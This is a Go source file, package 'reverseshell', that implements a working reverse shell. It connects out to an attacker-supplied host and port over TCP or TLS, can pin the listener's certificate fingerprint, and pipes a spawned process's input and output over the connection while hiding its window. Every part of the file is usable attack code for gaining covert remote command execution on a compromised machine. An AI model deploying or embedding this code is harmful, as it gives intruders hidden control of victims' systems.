package reverseshell

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"net"
	"os/exec"
	"syscall"
)

type ReverseShell struct {
	Protocol         string
	LhostLport       string
	Process          string
	Tls              bool
	FingerPrintCheck bool
}

func CheckFingerPrint(fingerprint []byte, c *tls.Conn) bool {
	s := c.ConnectionState()
	value := false

	for _, cert := range s.PeerCertificates {
		h := sha256.Sum256(cert.Raw)
		if bytes.Compare(h[0:], fingerprint) == 0 {
			value = true
		}
	}

	return value
}

func (r *ReverseShell) Exec() error {
	if r.Tls != true {
		c, err := net.Dial(r.Protocol, r.LhostLport)

		if err != nil {
			return err
		}

		defer c.Close()

		cmd := exec.Command(r.Process)
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()

	} else if r.FingerPrintCheck != true {
		TlsConfig := &tls.Config{InsecureSkipVerify: true}

		c, err := tls.Dial(r.Protocol, r.LhostLport, TlsConfig)

		if err != nil {
			return err
		}

		defer c.Close()

		cmd := exec.Command(r.Process)
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
	return nil
}

func (r *ReverseShell) SafeExec(fingerprint []byte) bool {
	if r.FingerPrintCheck != true {
		return false
	}

	TlsConfig := &tls.Config{InsecureSkipVerify: true}

	c, err := tls.Dial(r.Protocol, r.LhostLport, TlsConfig)

	if err != nil {
		return false
	}

	check := CheckFingerPrint(fingerprint, c)
	if check == false {
		return false
	} else {
		defer c.Close()
		cmd := exec.Command(r.Process)
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
	return true
}
